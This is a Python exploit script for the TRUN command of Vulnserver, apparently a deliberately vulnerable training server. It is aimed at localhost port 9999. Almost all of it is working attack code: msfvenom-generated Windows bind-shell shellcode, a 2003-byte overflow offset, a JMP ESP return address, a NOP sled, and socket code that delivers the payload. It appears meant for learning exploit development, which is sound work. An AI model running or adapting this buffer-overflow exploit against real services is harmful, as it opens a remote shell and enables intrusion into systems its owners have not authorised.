# Exploit for Vulnserver TRUN
# Author: Prashant Kumar (@notsoshant)

import socket

host = '127.0.0.1'
port = 9999

# msfvenom -p windows/shell_bind_tcp -f python -v shellcode -b \x00
shellcode =  ""
shellcode += "\xd9\xe1\xba\x47\xe2\xc8\x59\xd9\x74\x24\xf4\x58"
shellcode += "\x2b\xc9\xb1\x53\x31\x50\x17\x83\xe8\xfc\x03\x17"
shellcode += "\xf1\x2a\xac\x6b\x1d\x28\x4f\x93\xde\x4d\xd9\x76"
shellcode += "\xef\x4d\xbd\xf3\x40\x7e\xb5\x51\x6d\xf5\x9b\x41"
shellcode += "\xe6\x7b\x34\x66\x4f\x31\x62\x49\x50\x6a\x56\xc8"
shellcode += "\xd2\x71\x8b\x2a\xea\xb9\xde\x2b\x2b\xa7\x13\x79"
shellcode += "\xe4\xa3\x86\x6d\x81\xfe\x1a\x06\xd9\xef\x1a\xfb"
shellcode += "\xaa\x0e\x0a\xaa\xa1\x48\x8c\x4d\x65\xe1\x85\x55"
shellcode += "\x6a\xcc\x5c\xee\x58\xba\x5e\x26\x91\x43\xcc\x07"
shellcode += "\x1d\xb6\x0c\x40\x9a\x29\x7b\xb8\xd8\xd4\x7c\x7f"
shellcode += "\xa2\x02\x08\x9b\x04\xc0\xaa\x47\xb4\x05\x2c\x0c"
shellcode += "\xba\xe2\x3a\x4a\xdf\xf5\xef\xe1\xdb\x7e\x0e\x25"
shellcode += "\x6a\xc4\x35\xe1\x36\x9e\x54\xb0\x92\x71\x68\xa2"
shellcode += "\x7c\x2d\xcc\xa9\x91\x3a\x7d\xf0\xfd\x8f\x4c\x0a"
shellcode += "\xfe\x87\xc7\x79\xcc\x08\x7c\x15\x7c\xc0\x5a\xe2"
shellcode += "\x83\xfb\x1b\x7c\x7a\x04\x5c\x55\xb9\x50\x0c\xcd"
shellcode += "\x68\xd9\xc7\x0d\x94\x0c\x7d\x05\x33\xff\x60\xe8"
shellcode += "\x83\xaf\x24\x42\x6c\xba\xaa\xbd\x8c\xc5\x60\xd6"
shellcode += "\x25\x38\x8b\xc9\xe9\xb5\x6d\x83\x01\x90\x26\x3b"
shellcode += "\xe0\xc7\xfe\xdc\x1b\x22\x57\x4a\x53\x24\x60\x75"
shellcode += "\x64\x62\xc6\xe1\xef\x61\xd2\x10\xf0\xaf\x72\x45"
shellcode += "\x67\x25\x13\x24\x19\x3a\x3e\xde\xba\xa9\xa5\x1e"
shellcode += "\xb4\xd1\x71\x49\x91\x24\x88\x1f\x0f\x1e\x22\x3d"
shellcode += "\xd2\xc6\x0d\x85\x09\x3b\x93\x04\xdf\x07\xb7\x16"
shellcode += "\x19\x87\xf3\x42\xf5\xde\xad\x3c\xb3\x88\x1f\x96"
shellcode += "\x6d\x66\xf6\x7e\xeb\x44\xc9\xf8\xf4\x80\xbf\xe4"
shellcode += "\x45\x7d\x86\x1b\x69\xe9\x0e\x64\x97\x89\xf1\xbf"
shellcode += "\x13\xb9\xbb\x9d\x32\x52\x62\x74\x07\x3f\x95\xa3"
shellcode += "\x44\x46\x16\x41\x35\xbd\x06\x20\x30\xf9\x80\xd9"
shellcode += "\x48\x92\x64\xdd\xff\x93\xac"

# Crash at 2003
# 0x625011AF - JMP ESP

payload = "A"*2003 + "\xAF\x11\x50\x62" + "\x90"*20 + shellcode
payload += "D"*(5000-len(payload))

print("Payload length: " + str(len(payload)))
buffer1 = "TRUN /.:/" + payload

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer1)
s.close()
